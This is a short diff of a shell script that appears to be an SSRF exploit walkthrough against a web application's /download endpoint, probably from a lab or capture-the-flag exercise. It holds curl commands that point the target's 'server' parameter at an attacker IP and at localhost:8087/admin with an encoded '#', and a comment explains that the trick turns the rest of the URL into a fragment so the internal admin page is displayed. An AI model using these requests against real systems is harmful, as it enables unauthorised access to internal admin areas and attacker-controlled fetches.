@@ -23,4 +23,5 @@ curl -s -X GET "http://$target_ip:8087/download?server=$attack_ip:8087&id=754823
 
 # Access site admin area
 echo "3 - ACCESSING ADMIN AREA"
-curl -s -X GET "http://$target_ip:8087/download?server=localhost:8087/admin%23&id=75482342" -o /work/10-admin.html
+# We add # in the url, so that the remaining of the url is interpreted as a fragment. The fragment is not found, but the webpage is still displayed
+curl -s -X GET "http://$target_ip:8087/download?server=localhost:8087/admin%23&id=75482342" -o /work/10-admin.pdf
